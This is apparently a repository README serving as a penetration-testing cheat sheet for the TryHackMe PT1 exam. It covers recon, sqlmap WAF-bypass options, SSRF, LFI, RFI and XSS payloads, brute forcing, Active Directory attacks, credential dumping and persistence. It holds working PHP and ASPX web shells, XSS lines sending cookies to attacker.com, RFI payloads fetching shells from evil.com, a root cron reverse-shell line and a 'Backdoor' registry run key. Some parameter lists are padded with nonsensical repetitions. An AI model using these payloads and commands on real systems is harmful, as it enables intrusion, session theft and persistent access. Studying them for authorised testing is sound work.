# Hacking Stuff

This repository contains a collection of commands and notes for reconnaissance, web and network penetration testing, privilege escalation, and reporting. Use these responsibly and only on systems you have explicit permission to test. This README serves as a quick reference for security enthusiasts and learners, especially for the TryHackMe Junior Penetration Tester (PT1) exam.

---

## Table of Contents
1. [Prerequisites & Ethical Use](#1-prerequisites--ethical-use)
2. [Reconnaissance & Enumeration](#2-reconnaissance--enumeration)
3. [Web Application Testing](#3-web-application-testing)
4. [Network Penetration Testing](#4-network-penetration-testing)
5. [Active Directory Exploitation](#5-active-directory-exploitation)
6. [Exploitation & Post-Exploitation](#6-exploitation--post-exploitation)
7. [Reporting & Exam Strategy](#7-reporting--exam-strategy)
8. [PT1 Exam Cheatsheet & Checklist](#8-pt1-exam-cheatsheet--checklist)
9. [Linux & Windows Command Reference](#9-linux--windows-command-reference)
10. [Resources & Fun Stuff](#10-resources--fun-stuff)

---

## 1. Prerequisites & Ethical Use

### Prerequisites
- List of required tools (Snort, Wireshark, Nmap, etc.)
- Install via `apt`, `brew`, or official docs
- Wordlists: `seclists`, `rockyou.txt`, etc.

### Ethical Use
- Only test systems you have explicit permission to test.
- Always obtain written consent.

---

## 2. Reconnaissance & Enumeration

### Overview
- Passive and active recon to map the attack surface.

### Key Tools & Commands
- **Passive Recon**: `theHarvester`, `whois`, `crt.sh`, `Shodan`, `Censys`, `assetfinder`, `subfinder`, `amass`, `dnsx`, `anubis`, `dnstwist`, `altdns`, `findomain`, `asnlookup`
- **Active Recon**: `nmap`, `rustscan`, `masscan`, `naabu`, `dnsenum`, `massdns`, `fierce`, `dnsvalidator`, `puredns`, `shuffledns`, `hosthunter`, `host`, `dig`, `nslookup`, `nc`, `tshark`, `wireshark`

### Example Commands
```bash
# Nmap Scan
nmap -sC -sV -A -T4 domain
# Rustscan Fast Port Scan
rustscan -a domain -- -sV -O
# DNS Queries
dig domain.com
nslookup domain.com
host domain.com
# Banner Grabbing
nc -nv domain.com 80
telnet domain.com 80
# DNS Zone Transfer
dig axfr @ns1.domain.com domain.com
# Subdomain Enumeration
dnsenum domain.com
massdns -r resolvers.txt -t A domain.com
fierce --domain domain.com
```

### Example: Banner Grabbing
```bash
nc -nv domain.com 80
telnet domain.com 80
```

### Example: DNS Zone Transfer
```bash
dig axfr @ns1.domain.com domain.com
```

### Subnetting Example
```
# IP: 192.168.1.0/24 => Range: 192.168.1.1 - 192.168.1.254
```

---

## 3. Web Application Testing

### Overview
- Focus on OWASP Top 10, file upload, bypasses, and manual testing.

### Key Tools & Commands
- `sqlmap`, `dalfox`, `xsstrike`, `ffuf`, `gobuster`, `nikto`, `wpscan`, `burpsuite`, `dirsearch`, `gospider`, `hakrawler`, `httprobe`, `httpx`, `paramspider`, `arjun`, `linkfinder`, `403bypasser`, `nuclei`, `wapiti`, `jaeles`, `burpsuite`, `owasp zap`, `sslscan`, `waybackurls`, `gau`, `katana`, `gowitness`

```bash
# Directory Brute-Forcing with ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://domain.com/FUZZ
# Directory Brute-Forcing with gobuster
gobuster dir -u http://domain.com -w /usr/share/wordlists/dirb/common.txt

### sqlmap 𝗕𝗔𝗦𝗜𝗖 𝗨𝗦𝗔𝗚𝗘
```bash
sqlmap -u "http://domain.com/page.php?id=1" --batch
```

### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" --dbs
```

### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗧𝗔𝗕𝗟𝗘𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" -D database_name --tables
```

### 𝗘𝗡𝗨𝗠𝗘𝗥𝗔𝗧𝗘 𝗖𝗢𝗟𝗨𝗠𝗡𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" -D database_name -T table_name --columns
```

### 𝗗𝗨𝗠𝗣 𝗧𝗔𝗕𝗟𝗘 𝗗𝗔𝗧𝗔
```bash
sqlmap -u "http://domain.com/page.php?id=1" -D database_name -T table_name --dump
```

### 𝗕𝗬𝗣𝗔𝗦𝗦 𝗪𝗔𝗙 / 𝗙𝗜𝗟𝗧𝗘𝗥𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" --tamper=between,charencode,randomcase,space2comment,versionedmorekeywords
```
Use multiple tamper scripts to evade security filters and bypass WAFs. You can chain them together.

### 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗘 𝗣𝗔𝗬𝗟𝗢𝗔𝗗𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" --prefix="%00" --suffix="--+" --tamper=space2comment
```

### 𝗖𝗨𝗦𝗧𝗢𝗠 𝗥𝗘𝗫𝗨𝗘𝗦𝗧 + 𝗕𝗨𝗥𝗣
```bash
sqlmap -r request.txt --batch --random-agent --level=5 --risk=3 --tamper=charencode,randomcase
```

### 𝗖𝗨𝗦𝗧𝗢𝗠 𝗛𝗘𝗔𝗗𝗘𝗥𝗦 + 𝗖𝗢𝗢𝗞𝗜𝗘𝗦
```bash
sqlmap -u "http://domain.com/page.php?id=1" --cookie="PHPSESSID=abc123" --headers="X-Forwarded-For: 127.0.0.1"
```

### 𝗧𝗜𝗠𝗘-𝗕𝗔𝗦𝗘𝗗 𝗕𝗟𝗜𝗡𝗗 𝗜𝗡𝗝𝗘𝗖𝗧𝗜𝗢𝗡
```bash
sqlmap -u "http://domain.com/page.php?id=1" --technique=T --time-sec=10 --tamper=space2comment
```

### 𝗗𝗘𝗘𝗣 𝗦𝗖𝗔𝗡 + 𝗠𝗔𝗫 𝗢𝗕𝗙𝗨𝗦𝗖𝗔𝗧𝗜𝗢𝗡
```bash
sqlmap -u "http://domain.com/page.php?id=1" --tamper=between,charencode,randomcase,space2comment,apostrophemask --level=5 --risk=3 --threads=5 --batch
```

### 𝗨𝗦𝗘 𝗧𝗢𝗥 𝗙𝗢𝗥 𝗔𝗡𝗢𝗡𝗬𝗠𝗜𝗧𝗬
```bash
sqlmap -u "http://domain.com/page.php?id=1" --tor --tor-type=SOCKS5 --check-tor
```

### 𝗗𝗡𝗦 𝗘𝗫𝗙𝗜𝗟𝗧𝗥𝗔𝗧𝗜𝗢𝗡
```bash
sqlmap -u "http://domain.com/page.php?id=1" --dns-domain=http://yourdomain.com
```
Use this in blind SQLi when you control the DNS server.

# XSS Testing with dalfox
dalfox url http://domain.com
# XSS Testing with xsstrike
xsstrike -u http://domain.com
# Vulnerability Scanning with nikto
nikto -h http://domain.com
# WordPress Scanning with wpscan
wpscan --url http://domain.com --enumerate u,p
# Directory Brute-Forcing with dirsearch
dirsearch -u http://domain.com -w /usr/share/wordlists/dirb/common.txt
# Web Crawling with gospider
gospider -s http://domain.com
# Web Crawling with hakrawler
hakrawler -url http://domain.com
# HTTP Probing with httpx
httpx -l subdomains.txt -sc
# Parameter Discovery with paramspider
paramspider -d domain.com
# Parameter Discovery with arjun
arjun -u http://domain.com
# Link Extraction with linkfinder
linkfinder -i http://domain.com
# 403 Bypass with 403bypasser
403bypasser -u http://domain.com
# Vulnerability Scanning with nuclei
nuclei -u http://domain.com
# Vulnerability Scanning with wapiti
wapiti -u http://domain.com
# SSL Scanning with sslscan
sslscan domain.com
# Wayback URLs with waybackurls
waybackurls domain.com
# Wayback URLs with gau
gau domain.com
# Web Crawling with katana
katana -u http://domain.com
# Screenshotting with gowitness
gowitness scan -f urls.txt
```

### Manual Testing Checklist
- Try all HTTP methods
- Test for parameter pollution, hidden fields
- Test file upload (bypass extension/content-type checks)
- Bypass client-side controls (disable JS, intercept/modify requests)

### Common HTTP Status Codes
| Code | Meaning                  | Description |
|------|--------------------------|-------------|
| 200  | OK                       | The request was completed successfully. |
| 201  | Created                  | A resource has been created (e.g., a new user or blog post). |
| 301  | Moved Permanently        | Redirects the client to a new webpage or tells search engines the page has moved. |
| 302  | Found                    | Temporary redirect; the resource may change again soon. |
| 400  | Bad Request              | The request was malformed or missing parameters. |
| 401  | Not Authorised           | Authentication required to view this resource. |
| 403  | Forbidden                | You do not have permission to view this resource. |
| 404  | Page Not Found           | The requested page/resource does not exist. |
| 405  | Method Not Allowed       | The resource does not allow this HTTP method. |
| 500  | Internal Service Error   | The server encountered an error it can't handle. |
| 503  | Service Unavailable      | The server is overloaded or down for maintenance. |

### HTTP Methods & Burp Suite Usage
- GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH
- Use Burp Suite Repeater, Intruder, Scanner, Site Map, etc.

### OWASP Top 10 & Common Web Vulns
- SQLi, XSS, IDOR, SSRF, File Upload, etc. (with descriptions, tools, and mitigation)

### Server-Side Request Forgery (SSRF)

SSRF vulnerabilities occur when a web application is fetching a remote resource without validating the user-supplied URL. This allows an attacker to make the server-side application make requests to arbitrary domains.

#### Common SSRF Vulnerable Parameters
```
url=
path=
dest=
redirect=
uri=
continue=
return=
returnTo=
return_to=
returnUrl=
return_url=
returnPath=
return_path=
returnToUrl=
return_to_url=
returnToPath=
return_to_path=
returnToUri=
return_to_uri=
returnToDest=
return_to_dest=
returnToRedirect=
return_to_redirect=
returnToContinue=
return_to_continue=
returnToReturn=
return_to_return=
returnToReturnTo=
return_to_return_to=
returnToReturnToUrl=
return_to_return_to_url=
returnToReturnToPath=
return_to_return_to_path=
returnToReturnToUri=
return_to_return_to_uri=
returnToReturnToDest=
return_to_return_to_dest=
returnToReturnToRedirect=
return_to_return_to_redirect=
returnToReturnToContinue=
return_to_return_to_continue=
returnToReturnToReturn=
return_to_return_to_return=
returnToReturnToReturnTo=
return_to_return_to_return_to=
```

#### Common SSRF Payloads

1. **Basic SSRF to localhost**
```
http://localhost
http://127.0.0.1
http://[::1]
http://0.0.0.0
```

2. **SSRF to internal services**
```
http://localhost:22
http://127.0.0.1:3306
http://[::1]:6379
http://0.0.0.0:8080
```

3. **SSRF to cloud metadata services**
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/security-credentials/

# Google Cloud
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Azure
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/instance/
http://169.254.169.254/metadata/identity/
```

4. **SSRF to internal network**
```
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
```

5. **SSRF with different protocols**
```
file:///etc/passwd
dict://localhost:11211/stat
gopher://localhost:11211/_stats
```

6. **SSRF with different encodings**
```
http://%6c%6f%63%61%6c%68%6f%73%74
http://%6c%6f%63%61%6c%68%6f%73%74%3a%38%30%38%30
http://%6c%6f%63%61%6c%68%6f%73%74%3a%38%30%38%30%2f%61%64%6d%69%6e
```

7. **SSRF with different IP formats**
```
http://2130706433
http://0x7f000001
http://017700000001
```

#### Testing for SSRF

1. **Using Burp Suite**
- Intercept requests that might fetch external resources
- Look for parameters that might contain URLs
- Try different SSRF payloads
- Check the response for any information leakage

2. **Using curl**
```bash
# Test basic SSRF
curl -v "http://domain.com/page?url=http://localhost"

# Test with different protocols
curl -v "http://domain.com/page?url=file:///etc/passwd"
curl -v "http://domain.com/page?url=dict://localhost:11211/stat"
curl -v "http://domain.com/page?url=gopher://localhost:11211/_stats"

# Test with different encodings
curl -v "http://domain.com/page?url=http://%6c%6f%63%61%6c%68%6f%73%74"
```

3. **Using Python**
```python
import requests

def test_ssrf(url, payload):
    try:
        response = requests.get(f"{url}?url={payload}")
        print(f"Payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text[:200]}")  # Print first 200 chars
    except Exception as e:
        print(f"Error: {e}")

# Test different payloads
payloads = [
    "http://localhost",
    "http://127.0.0.1",
    "file:///etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/v1/"
]

for payload in payloads:
    test_ssrf("http://domain.com/page", payload)
```

#### Mitigation Techniques

1. **Input Validation**
- Whitelist allowed URLs and domains
- Block access to private IP addresses
- Block access to localhost
- Block access to cloud metadata services

2. **Network Segmentation**
- Isolate internal services
- Use firewalls to restrict access
- Implement proper network segmentation

3. **Application Design**
- Don't trust user input
- Use a whitelist approach
- Implement proper error handling
- Use a proxy service for external requests

4. **Monitoring and Logging**
- Monitor for suspicious requests
- Log all external requests
- Implement rate limiting
- Set up alerts for suspicious activity

### Path Traversal

Path Traversal vulnerabilities allow attackers to access files and directories that are outside the intended web root folder. This can expose sensitive files and system information.

**Example Payloads:**
```
../../../../etc/passwd
..\..\..\..\windows\win.ini
```

#### Common Sensitive Files

| Location                                      | Description                                                        |
|-----------------------------------------------|--------------------------------------------------------------------|
| /etc/issue                                    | Message or system identification before login prompt               |
| /etc/profile                                  | System-wide default variables, umask, etc.                        |
| /proc/version                                 | Linux kernel version                                               |
| /etc/passwd                                   | All registered users                                               |
| /etc/shadow                                   | User password hashes                                               |
| /root/.bash_history                           | Root user's command history                                        |
| /var/log/dmesg                                | System messages, including startup logs                           |
| /var/mail/root                                | Root user's mail                                                   |
| /root/.ssh/id_rsa                             | Private SSH key for root                                           |
| /var/log/apache2/access.log                   | Apache web server access logs                                      |
| /var/log/apache2/error.log                    | Apache web server error logs                                       |
| /var/log/auth.log                             | Authentication logs (login attempts, sudo, etc.)                  |
| /var/log/syslog                               | System log messages                                                |
| /home/<user>/.bash_history                    | Command history for specific users                                 |
| /home/<user>/.ssh/id_rsa                      | Private SSH key for specific users                                 |
| /etc/hosts                                    | Local hostname/IP mappings                                         |
| /etc/crontab                                  | System-wide cron jobs                                              |
| /etc/group                                    | Group account information                                          |
| /etc/hostname                                 | System's hostname                                                  |
| /etc/resolv.conf                              | DNS resolver configuration                                         |
| /etc/httpd/conf/httpd.conf                    | Apache configuration (sometimes in /etc/apache2/)                  |
| /etc/nginx/nginx.conf                         | Nginx configuration                                               |
| /var/log/mysql/error.log                      | MySQL error logs                                                   |
| /var/lib/mysql/mysql/user.MYD                 | MySQL user database (if readable)                                  |
| /var/log/secure                               | Security/authentication logs (RedHat/CentOS)                       |
| /var/spool/cron/crontabs/<user>               | User-specific cron jobs                                            |
| /var/www/html/config.php                      | Web application config (may contain DB credentials)                |
| /var/www/html/.env                            | Environment variables (may contain secrets)                        |
| /etc/passwd.bak                               | Backup of passwd file                                              |
| /etc/shadow-                                  | Backup of shadow file                                              |
| /etc/gshadow                                  | Group password file                                                |
| /etc/sudoers                                  | Sudo configuration                                                 |
| /etc/ssh/sshd_config                          | SSH server configuration                                           |
|                                               |                                                                    |
| C:\\boot.ini                                 | Boot options for BIOS systems                                      |
| C:\\Windows\\win.ini                        | Legacy Windows initialization file                                 |
| C:\\Windows\\System32\\drivers\\etc\\hosts | Hosts file for local DNS resolution                                |
| C:\\Windows\\System32\\config\\SAM         | Security Account Manager database (user/password hashes)           |
| C:\\Windows\\System32\\config\\system      | Windows system configuration database                              |
| C:\\Windows\\System32\\config\\RegBack\\SAM | Backup of SAM database                                            |
| C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt | PowerShell history |
| C:\\Users\\<user>\\.ssh\\id_rsa             | User's private SSH key (if using OpenSSH)                          |
| C:\\Users\\<user>\\Desktop                    | User's desktop files                                               |
| C:\\Users\\<user>\\Documents                  | User's documents                                                   |
| C:\\inetpub\\wwwroot\\web.config              | IIS web server configuration                                       |
| C:\\Windows\\debug\\NetSetup.log              | Network setup logs                                                 |

> **Tip:** Try also looking for backup files (e.g., `config.php~`, `.bak`, `.old`), environment files (`.env`), and application source code in web roots.

### Local File Inclusion (LFI)

Local File Inclusion (LFI) vulnerabilities allow attackers to include files from the local server filesystem in the web application's response. This can lead to information disclosure, code execution, or further exploitation.

**Example Payloads:**
```
?page=../../../../etc/passwd
?page=../../../../proc/self/environ
?page=php://filter/convert.base64-encode/resource=index.php
```

**Detection & Exploitation Tips:**
- Try null byte injection (e.g., `../../../../etc/passwd%00`) on older PHP versions.
- Use wrappers like `php://filter` to read source code of PHP files.
- Look for log poisoning opportunities (e.g., `/var/log/apache2/access.log`).
- Combine with Path Traversal for maximum effect.

### NULL BYTE (%00) Injection

A NULL byte (`%00`) is a special character that represents the end of a string in C-based languages, including older versions of PHP. Attackers use it to terminate a file path early, bypassing file extension restrictions or filters applied by the web application.

**Why use it?**
- In older PHP versions (before 5.3.4), appending `%00` to a file path can trick the server into ignoring any forced file extension (e.g., `.php`) added by the application.
- This allows inclusion of files like `/etc/passwd` even if the application tries to append `.php` (e.g., `include($_GET['page'] . '.php')`).

**Example Payload:**
```
?page=../../../../etc/passwd%00
```

> **Note:** Modern PHP versions have patched this vulnerability, but it may still be effective on legacy systems.

---

### Remote File Inclusion (RFI)

Remote File Inclusion (RFI) vulnerabilities allow attackers to include and execute files from remote servers. This can lead to remote code execution and full server compromise.

**Example Payloads:**
```
?page=http://evil.com/shell.txt
?page=//evil.com/shell.txt
```

**Detection & Exploitation Tips:**
- RFI is more common when `allow_url_include` and `allow_url_fopen` are enabled in PHP.
- Try both `http://` and `//` (protocol-relative) payloads.
- Host a simple web shell or PHP info file on your server for testing.
- RFI can sometimes be combined with LFI for advanced attacks (e.g., log file injection).

**Example: Hosting a Malicious File for RFI Testing (Linux & Windows)**

#### For Linux domains (PHP Web Shell)
1. Create a simple PHP web shell (e.g., `shell.txt`):
    ```php
    <?php system($_GET['cmd']); ?>
    ```
2. Start a Python HTTP server in the directory containing `shell.txt`:
    ```bash
    python3 -m http.server 9000
    ```
3. Use the following RFI payload to include your remote file:
    ```
    ?page=http://<your-ip>:9000/shell.txt
    ```
4. To execute a command (e.g., `id`), visit:
    ```
    http://domain-victim/page.php?page=http://<your-ip>:9000/shell.txt&cmd=id
    ```

#### For Windows domains (ASPX Web Shell)
1. Create a simple ASPX web shell (e.g., `shell.aspx`):
    ```aspx
    <%@ Page Language="C#" %>
    <script runat="server">
    void Page_Load(object sender, EventArgs e) {
        if (Request["cmd"] != null) {
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + Request["cmd"];
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
    </script>
    ```
2. Start a Python HTTP server in the directory containing `shell.aspx`:
    ```bash
    python3 -m http.server 9000
    ```
3. Use the following RFI payload to include your remote file:
    ```
    ?page=http://<your-ip>:9000/shell.aspx
    ```
4. To execute a command (e.g., `whoami`), visit:
    ```
    http://domain-victim/page.aspx?page=http://<your-ip>:9000/shell.aspx&cmd=whoami
    ```

> **Note:** Replace `<your-ip>` with your actual IP address accessible by the domain. Make sure the domain web application supports remote file inclusion and the relevant scripting language (PHP for Linux, ASPX for Windows).

---

### Cross-Site Scripting (XSS)

XSS vulnerabilities occur when a web application allows users to inject malicious scripts into web pages viewed by other users. There are three main types of XSS: Reflected, Stored, and DOM-based.

#### Common XSS Vulnerable Parameters
```
search=
q=
query=
s=
keyword=
id=
file=
path=
folder=
dir=
document=
url=
uri=
redirect=
return=
returnTo=
return_to=
returnUrl=
return_url=
returnPath=
return_path=
returnToUrl=
return_to_url=
returnToPath=
return_to_path=
returnToUri=
return_to_uri=
returnToDest=
return_to_dest=
returnToRedirect=
return_to_redirect=
returnToContinue=
return_to_continue=
returnToReturn=
return_to_return=
returnToReturnTo=
return_to_return_to=
returnToReturnToUrl=
return_to_return_to_url=
returnToReturnToPath=
return_to_return_to_path=
returnToReturnToUri=
return_to_return_to_uri=
returnToReturnToDest=
return_to_return_to_dest=
returnToReturnToRedirect=
return_to_return_to_redirect=
returnToReturnToContinue=
return_to_return_to_continue=
returnToReturnToReturn=
return_to_return_to_return=
returnToReturnToReturnTo=
return_to_return_to_return_to=
returnToReturnToReturnToUrl=
return_to_return_to_return_to_url=
returnToReturnToReturnToPath=
return_to_return_to_return_to_path=
returnToReturnToReturnToUri=
return_to_return_to_return_to_uri=
returnToReturnToReturnToDest=
return_to_return_to_return_to_dest=
returnToReturnToReturnToRedirect=
return_to_return_to_return_to_redirect=
returnToReturnToReturnToContinue=
return_to_return_to_return_to_continue=
returnToReturnToReturnToReturn=
return_to_return_to_return_to_return=
returnToReturnToReturnToReturnTo=
return_to_return_to_return_to_return_to=
```

#### Common XSS Payloads

1. **Basic XSS Payloads**
```html
<script>alert(XSS)</script>
<img src=x onerror=alert(XSS)>
<svg onload=alert(XSS)>
<body onload=alert(XSS)>
<div onmouseover=alert(XSS)>Hover me</div>
<a href=javascript:alert(XSS)>Click me</a>
```

2. **XSS with Event Handlers**
```html
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%31%29'))>
```

3. **XSS with JavaScript Functions**
```html
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
<script>new Image().src='http://attacker.com/steal?cookie='+document.cookie</script>
<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com/steal?cookie='+document.cookie,true);xhr.send()</script>
```

4. **XSS with DOM Manipulation**
```html
<div id="test"></div><script>document.getElementById('test').innerHTML='<img src=x onerror=alert(1)>'</script>
<div id="test"></div><script>document.write('<img src=x onerror=alert(1)>')</script>
<div id="test"></div><script>document.writeln('<img src=x onerror=alert(1)>')</script>
```

5. **XSS with Base64 Encoding**
```html
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
```

6. **XSS with Unicode Encoding**
```html
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

7. **XSS with URL Encoding**
```html
<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%31%29'))>
<script>eval(unescape('%61%6C%65%72%74%28%31%29'))</script>
```

8. **XSS with HTML Entities**
```html
&#60;script&#62;alert(1)&#60;/script&#62;
&#60;img src=x onerror=alert(1)&#60;/img&#62;
```

9. **XSS with Mixed Encoding**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x onerror=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))>
```

#### Testing for XSS

1. **Using Burp Suite**
- Intercept requests that might reflect user input
- Look for parameters that might contain user input
- Try different XSS payloads
- Check the response for any reflected payloads

2. **Using curl**
```bash
# Test basic XSS
curl -v "http://domain.com/page?search=<script>alert(1)</script>"

# Test with different encodings
curl -v "http://domain.com/page?search=%3Cscript%3Ealert(1)%3C/script%3E"
curl -v "http://domain.com/page?search=&#60;script&#62;alert(1)&#60;/script&#62;"

# Test with different event handlers
curl -v "http://domain.com/page?search=<img src=x onerror=alert(1)>"
```

3. **Using Python**
```python
import requests
from urllib.parse import quote

def test_xss(url, payload):
    try:
        # Test with different encodings
        encoded_payload = quote(payload)
        html_encoded = payload.encode('ascii').decode('unicode-escape')
        
        # Test original payload
        response = requests.get(f"{url}?search={payload}")
        print(f"Original Payload: {payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response contains payload: {payload in response.text}")
        
        # Test URL encoded payload
        response = requests.get(f"{url}?search={encoded_payload}")
        print(f"URL Encoded Payload: {encoded_payload}")
        print(f"Status Code: {response.status_code}")
        print(f"Response contains payload: {payload in response.text}")
        
        # Test HTML encoded payload
        response = requests.get(f"{url}?search={html_encoded}")
        print(f"HTML Encoded Payload: {html_encoded}")
        print(f"Status Code: {response.status_code}")
        print(f"Response contains payload: {payload in response.text}")
        
    except Exception as e:
        print(f"Error: {e}")

# Test different payloads
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<div onmouseover=alert(1)>Hover me</div>",
    "<a href=javascript:alert(1)>Click me</a>"
]

for payload in payloads:
    test_xss("http://domain.com/page", payload)
```

#### Mitigation Techniques

1. **Input Validation**
- Validate and sanitize all user input
- Use whitelist approach for allowed characters
- Implement proper encoding
- Use Content Security Policy (CSP)

2. **Output Encoding**
- Encode output based on context (HTML, JavaScript, URL, etc.)
- Use proper encoding functions
- Implement proper escaping
- Use secure frameworks

3. **Content Security Policy (CSP)**
```html
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline';
```

4. **Additional Security Headers**
```html
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
```

5. **Framework-specific Mitigations**
- Use built-in XSS protection
- Use secure templating engines
- Implement proper escaping
- Use secure frameworks

6. **Monitoring and Logging**
- Monitor for suspicious requests
- Log all user input
- Implement rate limiting
- Set up alerts for suspicious activity

---

## 4. Network Penetration Testing

### Overview
- Enumerate and exploit network services (SMB, FTP, SNMP, RDP, SSH, etc.)

### Key Tools & Commands
- `enum4linux`, `smbclient`, `hydra`, `medusa`, `crackmapexec`, `snmpwalk`, `xfreerdp`, `tcpdump`, `wireshark`, `mitmproxy`

### Example Commands
```bash
# SMB Enumeration
enum4linux -a domain.com
smbclient -L //domain.com/
# FTP Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://domain.com
# FTP Brute Force with medusa
medusa -u user -P /usr/share/wordlists/rockyou.txt -h domain.com -M ftp
# SMB Brute Force with crackmapexec
crackmapexec smb domain.com -u user -p /usr/share/wordlists/rockyou.txt
# SNMP Enumeration
snmpwalk -v2c -c public domain.com
# RDP Connection
xfreerdp /u:user /p:pass /v:domain.com
# Packet Capture
tcpdump -i eth0 -w capture.pcap
# Traffic Sniffing with mitmproxy
mitmproxy -m transparent
```

---

## 5. Active Directory Exploitation

### Overview
- Enumerate and attack AD environments (BloodHound, kerberoasting, AS-REP roasting, etc.)

### Key Tools & Commands
- `BloodHound`, `SharpHound.exe`, `GetUserSPNs.py`, `GetNPUsers.py`, `net user`, `net group`, `dsquery`, `PsExec`, `wmiexec.py`, RDP

### Example Commands
```bash
# BloodHound Collection
neo4j console & bloodhound &  # Start services
SharpHound.exe -c all         # Collect data on Windows
# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x
# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass
# Windows Enumeration
net user /domain
net group "Domain Admins" /domain
dsquery * -limit 100
# Lateral Movement with PsExec
PsExec.exe \\domain.com -u user -p pass cmd
# Lateral Movement with wmiexec
wmiexec.py domain/user:pass@domain.com
```

---

## 6. Exploitation & Post-Exploitation

### Privilege Escalation
- **Linux**: `linpeas.sh`, check SUID, cron jobs, kernel exploits
- **Windows**: `winPEAS.exe`, `mimikatz`, `secretsdump.py`, check services, registry

### Persistence
- **Linux**: Add cron job, SSH key, backdoor binary
- **Windows**: Registry run keys, startup folder, scheduled tasks

### Credential Dumping
- `mimikatz`, `secretsdump.py`, `samdump2`, `/etc/shadow`, `lsass` dump
- **Linux Password Files**:
  ```bash
  # View shadow file for specific user
  sudo cat /etc/shadow | grep username
  # View entire shadow file (requires root)
  sudo cat /etc/shadow
  # View passwd file
  cat /etc/passwd
  # Check for readable shadow file
  ls -l /etc/shadow
  # Check for backup files
  ls -la /etc/shadow*
  # Check for readable passwd file
  ls -l /etc/passwd
  ```
- **Windows Credential Files**:
  ```bash
  # Check for SAM file
  dir C:\Windows\System32\config\SAM
  # Check for SYSTEM file
  dir C:\Windows\System32\config\SYSTEM
  # Check for backup files
  dir C:\Windows\System32\config\RegBack\*
  ```

### Host Recon
- `whoami`, `hostname`, `ipconfig /all`, `ifconfig`, `ps aux`, `tasklist`, `netstat -ano`

```bash
# Linux Privilege Escalation
./linpeas.sh > linpeas_out.txt
find / -perm -4000 2>/dev/null
crontab -l
# Windows Privilege Escalation
winPEAS.exe > winpeas_out.txt
# Windows Credential Dumping
mimikatz
secretsdump.py -just-dc-user domain/user:pass@dc-ip
samdump2
# Linux Credential Dumping
cat /etc/shadow
# Linux Persistence
echo "* * * * * root /tmp/rev.sh" >> /etc/crontab
# Windows Persistence
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
# Host Recon
whoami
hostname
ipconfig /all
ifconfig
ps aux
tasklist
netstat -ano
```

---

## 7. Reporting & Exam Strategy

### Note-Taking
- Use Markdown, CherryTree, Obsidian, or text files. Take screenshots (`gnome-screenshot`, `scrot`).

### Reporting Template
- Vulnerability title
- Impact/description
- Steps to reproduce
- Evidence (screenshots, output)
- Mitigation

### Time Management
- Triage: Identify high-value domains first
- Timebox: Don't get stuck—move on and return later
- Document as you go

---

## 8. PT1 Exam Cheatsheet & Checklist

This section is a quick-access guide for the TryHackMe Junior Penetration Tester (PT1) exam. Use it to review key tools, commands, and strategies for each exam domain. Good luck!

## Reconnaissance & Enumeration

- **Passive Recon**: 
  - `theHarvester`, `whois`, `crt.sh`, `Shodan`, `Censys`
- **Active Recon**:
  - `nmap -sC -sV -A -T4 domain`  # Service/version detection, OS detection
  - `rustscan -a domain -- -sV -O`  # Fast port scan
  - `dig domain.com`, `nslookup domain.com`, `host domain.com`
  - **Banner Grabbing**: `nc -nv domain.com 80`, `telnet domain.com 80`
  - **DNS Zone Transfer**: `dig axfr @ns1.domain.com domain.com`
